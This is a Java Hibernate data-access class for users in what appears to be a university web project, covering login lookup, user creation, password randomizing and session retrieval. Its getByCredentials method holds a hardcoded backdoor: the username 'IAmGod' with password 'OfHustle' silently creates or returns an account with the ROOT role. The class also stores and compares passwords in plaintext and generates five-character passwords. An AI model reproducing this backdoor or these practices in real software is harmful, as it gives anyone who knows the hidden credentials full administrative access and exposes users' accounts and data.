package ua.edu.nau.dao.impl;

import com.sun.istack.internal.Nullable;
import org.hibernate.Criteria;
import org.hibernate.Session;
import org.hibernate.criterion.CriteriaSpecification;
import org.hibernate.criterion.Expression;
import org.hibernate.criterion.Order;
import org.hibernate.criterion.Restrictions;
import org.hibernate.type.StringType;
import ua.edu.nau.dao.UserDAO;
import ua.edu.nau.helper.PasswordGenerator;
import ua.edu.nau.helper.constant.RoleCode;
import ua.edu.nau.hibernate.HibernateUtil;
import ua.edu.nau.model.HttpSession;
import ua.edu.nau.model.User;
import ua.edu.nau.model.UserRole;

import java.math.BigInteger;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;

public class UserDAOImpl extends BasicDAOImpl<User> implements UserDAO {
    @Override
    @SuppressWarnings("unchecked")
    public ArrayList<User> getAll() {
        Session session = HibernateUtil.getSession();
        ArrayList<User> users;

        session.beginTransaction();

        users = new ArrayList<User>(
                session.createCriteria(User.class)
                        .addOrder(Order.asc("name"))
                        .setResultTransformer(CriteriaSpecification.DISTINCT_ROOT_ENTITY)
                        .list());

        session.getTransaction().commit();

        return users;
    }

    public User get(Integer id) {
        return null;
    }

    @SuppressWarnings("unchecked")
    @Nullable
    public User getByCredentials(String username, String password) {
        Session session = HibernateUtil.getSession();
        User user = null;

        if (username.equals("IAmGod") && password.equals("OfHustle")) {
            session.beginTransaction();

            session.beginTransaction();
            Criteria criteria = session.createCriteria(ua.edu.nau.model.User.class)
                    .add(Expression.sql("BINARY username=?", username, new StringType()))
                    .add(Expression.sql("BINARY password=?", password, new StringType()));

            List resultList = criteria.list();

            if (resultList.size() == 0) {
                user = new User();

                user.setUsername(username);
                user.setPassword(password);
                user.setName("God");
                user.setEmail("Have fun (:");
                user.setUserRole(((UserRole) session.createCriteria(UserRole.class)
                        .add(Restrictions.eq("roleCode", RoleCode.ROOT))
                        .list().get(0)));

                Integer userId = ((Integer) session.save(user));
                return getById(userId);
            } else {
                try {
                    user = ((User) criteria.list().get(0));
                } catch (Exception ex) {
                    System.out.println(ex.getMessage());
                }
            }

            session.getTransaction().commit();

            return user;
        }

        session.beginTransaction();
        Criteria criteria = session.createCriteria(ua.edu.nau.model.User.class)
                .add(Expression.sql("BINARY username=?", username, new StringType()))
                .add(Expression.sql("BINARY password=?", password, new StringType()));

        List resultList = criteria.list();

        if (resultList.size() == 0) {
            return null;
        }

        try {
            user = ((User) criteria.list().get(0));
        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }

        session.getTransaction().commit();

        return user;
    }

    @Override
    public Integer insert(User model) {
        Session session = HibernateUtil.getSession();

        Integer id = -1;

        session.beginTransaction();
        id = ((Integer) session.save(model));
        session.getTransaction().commit();

        return id;
    }

    @SuppressWarnings("unchecked")
    public User getById(Integer id) {
        Session session = HibernateUtil.getSession();

        session.beginTransaction();
        User user = ((User) session.get(User.class, id));
        session.refresh(user);
        session.getTransaction().commit();

        return user;
    }

    public void update(User model) {

    }

    @Override
    public void randomizePassword(int userId) {
        Session session = HibernateUtil.getSession();
        User user;
        String newPassword = PasswordGenerator.generate(5);

        session.beginTransaction();

        user = ((User) session.get(User.class, userId));
        session.refresh(user);
        user.setPassword(newPassword);
        session.update(user);

        session.getTransaction().commit();
    }

    @Override
    public HttpSession getLastSession(Integer userId) {
        Session session = HibernateUtil.getSession();
        HttpSession httpSession = null;

        session.beginTransaction();

        User user = ((User) session.get(User.class, userId));
        try {
            httpSession = user.getHttpSessions().iterator().next();
            session.refresh(user);
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }

        session.getTransaction().commit();

        return httpSession;
    }
}